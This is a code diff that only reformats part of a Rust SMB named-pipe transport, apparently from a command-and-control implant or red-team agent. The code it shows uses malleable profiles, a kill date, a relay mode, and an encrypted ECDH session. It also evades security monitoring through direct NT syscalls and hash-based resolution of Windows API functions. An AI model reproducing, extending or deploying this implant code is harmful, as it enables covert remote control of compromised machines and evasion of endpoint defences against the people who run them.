@@ -79,10 +79,7 @@ mod nt_pipe {
     const GENERIC_WRITE: u32 = 0x40000000;
 
     /// Build a Windows NT UNICODE_STRING on the stack.
-    unsafe fn init_unicode_string(
-        dest: &mut winapi::shared::ntdef::UNICODE_STRING,
-        s: &[u16],
-    ) {
+    unsafe fn init_unicode_string(dest: &mut winapi::shared::ntdef::UNICODE_STRING, s: &[u16]) {
         dest.Buffer = s.as_ptr() as *mut _;
         dest.Length = (s.len() * 2) as u16;
         dest.MaximumLength = dest.Length;
@@ -97,7 +94,10 @@ mod nt_pipe {
         } else {
             format!(r"\??\{}", pipe_path)
         };
-        let nt_wide: Vec<u16> = nt_path_str.encode_utf16().chain(std::iter::once(0)).collect();
+        let nt_wide: Vec<u16> = nt_path_str
+            .encode_utf16()
+            .chain(std::iter::once(0))
+            .collect();
 
         let mut name_str: winapi::shared::ntdef::UNICODE_STRING = std::mem::zeroed();
         unsafe { init_unicode_string(&mut name_str, &nt_wide) };
@@ -136,10 +136,7 @@ mod nt_pipe {
     }
 
     /// Read bytes from a file handle via `NtReadFile` (NT direct syscall).
-    pub unsafe fn read_file(
-        handle: *mut std::ffi::c_void,
-        buf: &mut [u8],
-    ) -> Result<usize> {
+    pub unsafe fn read_file(handle: *mut std::ffi::c_void, buf: &mut [u8]) -> Result<usize> {
         let mut iosb: crate::win_types::IO_STATUS_BLOCK = std::mem::zeroed();
         let status = crate::syscall!(
             "NtReadFile",
@@ -165,10 +162,7 @@ mod nt_pipe {
     }
 
     /// Write bytes to a file handle via `NtWriteFile` (NT direct syscall).
-    pub unsafe fn write_file(
-        handle: *mut std::ffi::c_void,
-        buf: &[u8],
-    ) -> Result<usize> {
+    pub unsafe fn write_file(handle: *mut std::ffi::c_void, buf: &[u8]) -> Result<usize> {
         let mut iosb: crate::win_types::IO_STATUS_BLOCK = std::mem::zeroed();
         let status = crate::syscall!(
             "NtWriteFile",
@@ -209,7 +203,10 @@ mod nt_pipe {
         let wide: Vec<u16> = pipe_path.encode_utf16().chain(std::iter::once(0)).collect();
         let wait_fn: Option<unsafe extern "system" fn(*const u16, u32) -> i32> = (|| unsafe {
             let k32 = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_KERNEL32_DLL)?;
-            let addr = pe_resolve::get_proc_address_by_hash(k32, pe_resolve::hash_str(b"WaitNamedPipeW\0"))?;
+            let addr = pe_resolve::get_proc_address_by_hash(
+                k32,
+                pe_resolve::hash_str(b"WaitNamedPipeW\0"),
+            )?;
             Some(std::mem::transmute(addr))
         })();
         let wait_fn = wait_fn.ok_or_else(|| anyhow!("WaitNamedPipeW resolution failed"))?;
@@ -358,10 +355,7 @@ impl SmbPipeTransport {
     /// performed to derive a forward-secret session key.  The PSK is used
     /// for authentication during the exchange but is never used directly as
     /// the session key.
-    pub async fn new(
-        profile: &MalleableProfile,
-        psk: &[u8],
-    ) -> Result<Self> {
+    pub async fn new(profile: &MalleableProfile, psk: &[u8]) -> Result<Self> {
         let host = profile
             .smb_pipe_host
             .as_deref()
@@ -372,14 +366,9 @@ impl SmbPipeTransport {
             .as_deref()
             .unwrap_or(common::ioc::IOC_PIPE_NAME);
 
-        let mode = profile
-            .smb_pipe_mode
-            .as_deref()
-            .unwrap_or("smb");
+        let mode = profile.smb_pipe_mode.as_deref().unwrap_or("smb");
 
-        let tcp_relay_port = profile
-            .smb_tcp_relay_port
-            .unwrap_or(4455);
+        let tcp_relay_port = profile.smb_tcp_relay_port.unwrap_or(4455);
         let kill_date = profile.kill_date.clone();
 
         match mode {
@@ -393,14 +382,18 @@ impl SmbPipeTransport {
                     &mut stream,
                     psk,
                     true, // client sends first
-                ).await.map_err(|e| anyhow!("smb-pipe: ECDH key exchange failed: {e}"))?;
+                )
+                .await
+                .map_err(|e| anyhow!("smb-pipe: ECDH key exchange failed: {e}"))?;
                 info!("smb-pipe: forward-secret session established");
 
-                Ok(Self::Relay { stream, session, kill_date })
+                Ok(Self::Relay {
+                    stream,
+                    session,
+                    kill_date,
+                })
             }
-            _ => {
-                Self::connect_smb_pipe(host, pipe_name, psk, kill_date).await
-            }
+            _ => Self::connect_smb_pipe(host, pipe_name, psk, kill_date).await,
         }
     }
 
@@ -437,7 +430,10 @@ impl SmbPipeTransport {
                             &psk_owned,
                             true, // client sends first
                         )?;
-                        Ok::<(nt_pipe::NtPipeHandle, CryptoSession), anyhow::Error>((pipe_handle, session))
+                        Ok::<(nt_pipe::NtPipeHandle, CryptoSession), anyhow::Error>((
+                            pipe_handle,
+                            session,
+                        ))
                     })
                     .await
                     .map_err(|e| anyhow!("smb-pipe: ECDH task panicked: {e}"))?
@@ -445,13 +441,15 @@ impl SmbPipeTransport {
 
                     info!("smb-pipe: forward-secret session established");
                     let pipe = std::sync::Arc::new(pipe_handle);
-                    return Ok(Self::Pipe { pipe, session, kill_date });
+                    return Ok(Self::Pipe {
+                        pipe,
+                        session,
+                        kill_date,
+                    });
                 }
                 Err(e) => {
                     let win_err = nt_pipe::last_win32_error();
-                    if nt_pipe::is_pipe_busy_error(win_err)
-                        && attempt <= MAX_PIPE_BUSY_RETRIES
-                    {
+                    if nt_pipe::is_pipe_busy_error(win_err) && attempt <= MAX_PIPE_BUSY_RETRIES {
                         warn!(
                             "smb-pipe: pipe busy on attempt {attempt}/{MAX_PIPE_BUSY_RETRIES}, \
                              retrying in {delay:?}"
@@ -464,11 +462,8 @@ impl SmbPipeTransport {
                         tokio::time::sleep(delay).await;
 
                         // Exponential back-off with jitter.
-                        let jitter = Duration::from_millis(
-                            (rand::random::<f64>() * 500.0) as u64,
-                        );
-                        delay = ((delay * 2) + jitter)
-                            .min(Duration::from_secs(RETRY_MAX_SECS));
+                        let jitter = Duration::from_millis((rand::random::<f64>() * 500.0) as u64);
+                        delay = ((delay * 2) + jitter).min(Duration::from_secs(RETRY_MAX_SECS));
                     } else {
                         return Err(anyhow!(
                             "smb-pipe: failed to open pipe '{pipe_path}' after \
@@ -509,7 +504,9 @@ impl Transport for SmbPipeTransport {
         }
 
         match self {
-            Self::Relay { stream, session, .. } => {
+            Self::Relay {
+                stream, session, ..
+            } => {
                 let plain = bincode::serialize(&msg)?;
                 let enc = session.encrypt(&plain);
                 stream.write_u32_le(enc.len() as u32).await?;
@@ -547,7 +544,9 @@ impl Transport for SmbPipeTransport {
         }
 
         match self {
-            Self::Relay { stream, session, .. } => {
+            Self::Relay {
+                stream, session, ..
+            } => {
                 let len = stream.read_u32_le().await?;
                 if len > MAX_FRAME_BYTES {
                     anyhow::bail!("smb-pipe: frame too large: {len} bytes");
